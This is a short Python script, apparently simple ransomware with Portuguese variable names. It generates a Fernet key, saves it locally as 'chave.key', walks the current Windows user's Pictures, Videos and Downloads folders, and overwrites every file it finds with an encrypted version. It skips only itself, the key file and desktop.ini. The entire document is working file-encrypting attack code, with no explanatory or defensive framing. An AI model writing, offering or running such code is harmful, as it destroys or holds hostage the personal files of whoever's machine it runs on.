import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()
with open('chave.key', 'wb') as chave:
    chave.write(key)

username = os.getenv('USERNAME')
folders = [
    os.path.join(fr"C:\Users\{username}\OneDrive\Imagens"),
    os.path.join(fr"C:\Users\{username}\Videos"),
    os.path.join(fr"C:\Users\{username}\Downloads")
]

arquivos = []

for folder in folders:
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file in ['01main.py', 'chave.key', 'desktop.ini']:
                continue

            file_path = os.path.join(root, file)
            arquivos.append(file_path)
            
for arquivo in arquivos:
    with open(arquivo, 'rb') as file:
        conteudo = file.read()

        conteudo_criptografado = Fernet(key).encrypt(conteudo)

        with open(arquivo, 'wb') as file:
            file.write(conteudo_criptografado)
# print(arquivos)